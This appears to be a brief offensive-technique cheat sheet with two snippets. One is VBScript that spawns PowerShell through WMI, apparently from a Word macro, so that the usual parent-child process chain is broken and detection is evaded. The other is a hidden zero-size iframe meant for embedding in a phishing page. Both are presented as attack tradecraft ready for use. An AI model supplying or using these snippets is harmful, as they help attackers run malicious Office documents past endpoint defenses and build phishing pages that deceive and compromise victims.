- Break MS Word parent-child releationship 
	```VBScript
	Dim proc As Object
	Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
	proc.Create "powershell"
	```

- Embedding hidden iframe in phishing page
```HTML
<iframe src="<URI/URL>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style=visibility:hidden;display:none"> </iframe>
```